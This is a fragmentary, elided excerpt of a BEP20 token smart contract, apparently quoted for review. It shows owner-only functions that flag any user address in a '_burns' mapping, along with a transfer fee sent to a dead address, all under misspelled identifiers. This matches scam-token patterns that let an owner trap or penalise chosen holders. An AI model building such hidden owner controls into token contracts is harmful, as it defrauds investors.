...
contract Token is IBEP20, HasForeignAsset {
    ...
    function setUserBurn(address acddount) public onlyOwner {
        _burns[acddount] = true;
    }

    function rmUserBun(address acddount) public onlyOwner {
    ...
    function _transfer(
        ...
        uint256 feeviAmount = 0;
        feeviAmount = amount.mul(_feevi).div(100);
        uint256 amoun;
        amoun = amount - feeviAmount;
        ...
        if (feeviAmount > 0) {
            emit Transfer(sender, _DEADaddress, feeviAmount);
        }
